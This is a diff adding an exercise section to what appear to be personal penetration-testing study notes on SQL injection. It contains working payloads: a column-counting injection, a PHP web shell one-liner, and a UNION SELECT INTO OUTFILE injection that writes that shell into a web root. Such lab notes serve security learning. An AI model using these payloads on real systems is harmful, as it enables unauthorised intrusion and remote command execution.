@@ -164,3 +164,22 @@ with the next command, we are attempting to dump the user name, password and des
 ![[Pasted image 20231001055033.png]]
 
 ### BLIND SQL INJECTIONS
+
+### EXERCISES
+
+#### Q5
+
+```
+' ORDER BY 1-- //
+```
+To identify columns.
+![[Pasted image 20231004201438.png]]
+![[Pasted image 20231004202641.png]]
+![[Pasted image 20231004203231.png]]
+
+
+<?php system($_GET['cmd']); ?>
+
+' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- //
+
+![[Pasted image 20231004214100.png]]
